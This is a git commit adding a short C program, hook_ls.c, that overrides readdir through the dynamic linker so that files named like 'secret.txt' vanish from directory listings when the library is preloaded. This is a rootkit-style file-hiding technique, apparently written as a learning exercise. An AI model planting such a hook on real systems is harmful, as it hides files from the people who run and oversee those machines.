669704dfdf26c8f1309fca4d23d01e3fdfb76bd1
Minh Triet <cybersis06@gmail.com>
2023-10-25 19:15:59 -0700

    Adding hook_ls program

---
+++ hook_ls/hook_ls.c
@@ -0,0 +1,24 @@
+#include <dlfcn.h>
+#include <dirent.h>
+#include <string.h>
+#include <stdio.h>
+
+#define FILENAME "secret.txt"
+
+int count = 0;
+
+struct dirent *(*original_readdir)(DIR *);
+struct dirent *readdir(DIR *dirp) 
+{
+	struct dirent *ret;
+
+	original_readdir = dlsym (RTLD_NEXT, "readdir");
+	while((ret = original_readdir(dirp)))
+	{
+		count += 1;
+		if(strstr(ret->d_name,FILENAME) == NULL) {
+			break;
+		}
+	}
+	return ret;
+}
